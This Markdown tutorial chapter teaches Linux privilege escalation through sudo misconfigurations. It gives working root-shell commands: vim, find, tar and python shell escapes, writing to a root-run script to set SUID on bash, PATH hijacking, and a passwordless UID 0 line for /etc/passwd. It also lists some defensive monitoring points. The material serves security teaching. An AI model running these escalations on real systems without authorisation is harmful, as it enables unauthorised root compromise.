# 03. Sudo Misconfigurations

## Overview

`sudo` is one of the most powerful privilege delegation mechanisms in Linux. It allows a user to execute commands as another user, often as root.

Privilege escalation occurs when `sudo` is misconfigured, granting excessive or unsafe command execution permissions.

Understanding `sudo` abuse is essential because it is one of the most common real-world Linux privilege escalation vectors.

---

## Understanding Sudo

Check current sudo permissions:

```bash id="s1"
sudo -l
```

This command reveals what a user is allowed to execute as root or other users.

Example output:

```text id="s2"
User user may run the following commands:
    (ALL) NOPASSWD: /usr/bin/vim
    (root) /usr/bin/python3
```

---

## Key Sudo Misconfiguration Types

---

## 1. Full Root Access via NOPASSWD

Example:

```text id="s3"
(user) NOPASSWD: ALL
```

### Exploitation:

```bash id="s4"
sudo su
```

or

```bash id="s5"
sudo -i
```

✔ Immediate root access

---

## 2. Dangerous Binary Abuse (GTFOBins)

If a user can run binaries as root, they can often escape to a shell.

### Example:

```text id="s6"
(user) NOPASSWD: /usr/bin/vim
```

### Exploitation:

```bash id="s7"
sudo vim -c ':!sh'
```

➡ Root shell spawned

---

### Other common GTFOBins:

| Binary   | Exploit idea     |
| -------- | ---------------- |
| `less`   | `!sh`            |
| `awk`    | system shell     |
| `find`   | execute commands |
| `python` | os.system shell  |
| `perl`   | spawn shell      |

---

## 3. Sudo with Wildcards

Example:

```text id="s8"
(user) NOPASSWD: /usr/bin/tar *
```

### Exploitation:

Tar can execute commands via options:

```bash id="s9"
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

➡ Root shell

---

## 4. Script Execution Abuse

Example:

```text id="s10"
(user) NOPASSWD: /opt/backup.sh
```

### If script is writable:

```bash id="s11"
echo "/bin/bash" >> /opt/backup.sh
```

### Or replace content:

```bash id="s12"
echo "chmod +s /bin/bash" > /opt/backup.sh
```

➡ Next execution = root

---

## 5. Environment Variable Abuse

Some sudo rules preserve environment variables.

Check:

```bash id="s13"
sudo -l
```

If `env_keep` is enabled, attacker can inject:

* PATH hijacking
* LD_PRELOAD abuse

Example:

```bash id="s14"
export PATH=/tmp:$PATH
sudo vulnerable_command
```

---

## 6. Python / Interpreter Abuse

Example:

```text id="s15"
(user) NOPASSWD: /usr/bin/python3 /opt/script.py
```

If script allows input or imports:

```bash id="s16"
sudo python3 -c 'import os; os.system("/bin/sh")'
```

➡ Root shell

---

## 7. Editing System Files via Sudo

Example:

```text id="s17"
(user) NOPASSWD: /usr/bin/nano /etc/passwd
```

### Exploitation:

Add new root user:

```text id="s18"
evil::0:0::/root:/bin/bash
```

---

## Real-World Privilege Escalation Chains

### Chain 1: Vim Abuse → Root

1. `sudo -l` shows vim allowed
2. Run:

```bash id="c1"
sudo vim -c ':!sh'
```

3. Root shell obtained

---

### Chain 2: Script Modification → Root

1. `sudo -l` shows `/opt/backup.sh`
2. Script is writable
3. Inject `/bin/bash`
4. Wait for cron or manual execution

---

### Chain 3: GTFOBins Abuse

1. `sudo -l` shows `find`
2. Execute shell via:

```bash id="c2"
sudo find . -exec /bin/sh \; -quit
```

---

## Detection & Defensive Perspective

From a security standpoint, monitor:

* Unrestricted sudo usage (`NOPASSWD: ALL`)
* Execution of interactive binaries via sudo
* Unexpected shell spawning from allowed binaries
* Modification of system scripts executed by root
* Environment variable manipulation in sudo context

---

## Key Mindset

When analyzing sudo privileges, always ask:

* Can I execute a shell indirectly?
* Can I modify input to a root-run binary?
* Can I abuse flags or arguments?
* Can I control files used by the command?
* Can I hijack environment variables?

---

## Summary

Sudo misconfigurations are powerful because:

> They turn intended administrative delegation into full system compromise.

Even a single unsafe rule can immediately lead to root access.
